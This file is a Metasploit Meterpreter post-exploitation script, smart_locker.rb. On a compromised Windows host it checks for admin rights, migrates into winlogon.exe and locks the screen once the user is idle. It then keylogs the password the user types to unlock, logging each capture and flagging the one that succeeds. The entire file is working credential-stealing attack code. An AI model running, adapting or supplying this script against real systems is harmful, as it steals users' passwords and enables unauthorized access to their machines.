# $id: smart_locker.rb
#
# Authors: CG, Mubix
# Additional idea: edsmiley
#-----------------------------------------------------------------------


sessions = client

def usage
	print_line("Smart Locker Meterpreter Script")
	print_line("This script will start the Meterpreter Keylogger and save all keys")
	print_line("in a log file for later anlysis. To stop capture hit Ctrl-C")
	print_line("Usage:" + @@exec_opts.usage)
	raise Rex::Script::Completed
end


def check_admin
	if client.railgun.dll['shell32'] == nil 
		client.railgun.add_dll('shell32') 
	end

	if (client.railgun.shell32.functions['IsUserAnAdmin']) == nil 
		client.railgun.add_function('shell32', 'IsUserAnAdmin', 'BOOL', []) 
	end

	status = client.railgun.shell32.IsUserAnAdmin()
	return status['return']
end

def get_winlogon
	winlogon = []
	session.sys.process.get_processes().each do |x|
		if x['name'].downcase == "winlogon.exe"
			winlogon << x
		end
	end
	if winlogon.size == 0
		print_status("Winlogon not found! Exiting")
		raise Rex::Script::Completed
	elsif winlogon.size == 1
		return winlogon[0]['pid']
	else
		print_error("Multiple WINLOGON processes found, run manually and specify pid")
		print_error("Be wise. XP / VISTA / 7 use session 0 - 2k3/2k8 use RDP session")
		winlogon.each do |tp|
			print_status("Winlogon.exe - PID: #{tp['pid']} - Session: #{tp['session']}")
		end
		raise Rex::Script::Completed
	end
end

#Function for starting the keylogger
def startkeylogger(session)
	begin
		print_status("Starting the keystroke sniffer...") 
		session.ui.keyscan_start
		return true
	rescue
		print_status("Failed to start Keylogging!")
		return false
	end
end

# Function for Collecting Capture (pulled from Carlos Perez's Keylogrecorder)
def keycap(session, keytime, logfile)
	begin
		rec = 1
		#Creating DB for captured keystrokes
		print_status("Keystrokes being saved in to #{logfile}")
		#Inserting keystrokes every number of seconds specified
		print_status("Recording ")
		while rec == 1
			#getting Keystrokes
			data = session.ui.keyscan_dump
			outp = ""
			data.unpack("n*").each do |inp|
				fl = (inp & 0xff00) >> 8
				vk = (inp & 0xff)
				kc = VirtualKeyCodes[vk]

				f_shift = fl & (1<<1)
				f_ctrl  = fl & (1<<2)
				f_alt   = fl & (1<<3)

				if(kc)
					name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
					case name
					when /^.$/
						outp << name
					when /shift|click/i
					when 'Space'
						outp << " "
					else
						outp << " <#{name}> "
					end
				else
					outp << " <0x%.2x> " % vk
				end
			end
			sleep(2)
			file_local_write(logfile,"#{outp}\n")
			if outp != nil and outp.chomp.lstrip != "" then
				print_status("Password?: #{outp}")
			end
			still_locked = 1
			# Check to see if the screen saver is on, then check to see if they have logged back in yet.
			screensaver = client.railgun.user32.SystemParametersInfoA(114,nil,1,nil)['pvParam'].unpack("C*")[0]
			if screensaver == 0
				still_locked = client.railgun.user32.GetForegroundWindow()['return']
			end
			if still_locked == 0
				print_status("They logged back in, the last password was probably right.")
				raise 'win'
			end
			currentidle = session.ui.idle_time
			if screensaver == 0
				print_status("System has currently been idle for #{currentidle} seconds and the screensaver is OFF")
			else
				print_status("System has currently been idle for #{currentidle} seconds and the screensaver is ON")
			end
			sleep(keytime.to_i)
		end
	rescue::Exception => e
		if e.message != 'win'
			print("\n")
			print_status("#{e.class} #{e}")
		end
		print_status("Stopping keystroke sniffer...")
		session.ui.keyscan_stop
	end
end





#############
#  MAIN
#############

# Script Options
@@exec_opts = Rex::Parser::Arguments.new(
	"-h"  => [ false, "Help menu." ],
	"-w"  => [ false,  "Wait for lockout instead of doing the lockout"],
	"-t"  => [ true,  "Time interval in seconds between recollection of keystrokes, default 30 seconds." ],
	"-i"  => [ true,  "Idletime to wait before locking the screen automatically. Default 300 seconds (5 minutes)." ],
	"-b"  => [ true,  "Heartbeat time between idle checks. Default is 30 seconds." ],
	"-p"  => [ true,  "Target PID - used when multiple Winlogon sessions are present."]
)

#
# Default variables
#


# Log file variables
host,port = session.tunnel_peer.split(':')  							# Get hostname
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S") 				# Create Filename info to be appended to downloaded files
logs = ::File.join(Msf::Config.log_directory, 'scripts', 'smartlocker')  	# Create a directory for the logs
::FileUtils.mkdir_p(logs) 											# Create the log directory
logfile = logs + ::File::Separator + host + filenameinfo + ".txt" 			# Logfile name

# Idletime variables
keytime = 30
heartbeat = 30
idletime = 300
targetpid = nil
justwait = false

@@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-t"
		keytime = val.to_i
	when "-h"
		usage
	when "-w"
		justwait = true
	when "-i"
		idletime = val.to_i
	when "-b"
		heartbeat = val.to_i
	when "-p"
		targetpid = val.to_i
	end
}

# reset defaults options if non are specified (because you are an idiot)
keytime.nil? ? keytime = 30:
idletime.nil? ? idletime = 300:
heartbeat.nil? ? heartbeat = 30:

#Make sure we are on a Windows host
if client.platform !~ /win32|win64/ 
        print_status "The script does not support this meterpreter type" 
        raise Rex::Script::Completed 
end

# Load railgun if it isn't already
if client.railgun.present? != true 
        client.core.use("railgun") 
	print_status("Railgun wasn't present.. Loaded")
end


# Check admin status
admin = check_admin
if admin == false
	print_error("User is not an admin, exiting")
	raise Rex::Script::Completed
end

mypid = session.sys.process.getpid
if targetpid == nil
	targetpid = get_winlogon
	print_status("Found WINLOGON at PID:#{targetpid}")
else
	print_status("WINLOGON PID:#{targetpid} specified. I'm trusting you..")
end

if mypid == targetpid
	print_status("Already in WINLOGON no need to migrate")
else
	print_status("Migrating from PID:#{mypid}")
	session.core.migrate(targetpid)
	print_status("Migrated to WINLOGON PID: #{targetpid} successfully")
end

#Load user32 into Winlogon
client.railgun.user32

# Override SystemParametersInfo Railgun call to check for Screensaver
# Unfortunately 'pvParam' changes it's type for each uiAction so
# it cannot be changed in the regular railgun defs
client.railgun.add_function('user32','SystemParametersInfoA','BOOL',[
	["DWORD","uiAction","in"],
	["DWORD","uiParam","in"],
	["PBLOB","pvParam","out"],
	["DWORD","fWinIni","in"]
])


print_good("Begginning keylogging on #{client.info}")
file_local_write(logfile,"#{client.info}\n")

if justwait then
	print_status("Waiting for user to lock out their session")
	locked = false
	while locked == false
		if client.railgun.user32.GetForegroundWindow()['return'] != 0
			locked = true
			print_status("Session has been locked out")
		else
			# sleep(keytime.to_i) / hardsleep applied due to missing loging right after lockout.. no good way to solve this
			sleep(2)
		end
	end
else
	currentidle = session.ui.idle_time
	print_status("System has currently been idle for #{currentidle} seconds")
	while currentidle <= idletime do
		print_status("Current Idletime: #{currentidle} seconds")
		sleep(heartbeat)
		currentidle = session.ui.idle_time
	end
	client.railgun.user32.LockWorkStation()
end

if startkeylogger(session)
	keycap(session, keytime, logfile)
end
